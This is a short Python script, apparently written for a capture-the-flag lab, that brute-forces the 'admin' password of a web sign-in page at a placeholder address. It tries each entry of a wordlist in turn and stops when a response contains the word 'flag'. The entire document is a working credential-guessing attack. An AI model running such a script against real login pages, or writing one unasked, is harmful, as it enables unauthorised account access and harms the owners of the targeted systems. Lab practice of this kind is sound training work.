import requests

url = "http://VM_IP/?page=signin"
username = "admin"
wordlist = "passwords.txt"
success_indicator = "flag"

with open(wordlist, "r", encoding="utf-8", errors="ignore") as file:
    for password in file:
        password = password.strip()
        print(f"[*] Trying password: {password}")

        response = requests.post(url, data={
            "username": username,
            "password": password,
            "Login": "Login"
        })

        if success_indicator in response.text.lower():
            print(f"[+] SUCCESS! Password found: {password}")
            print(f"[+] Response snippet:\n{response.text}")
            break
    else:
        print("[-] No valid password found.")
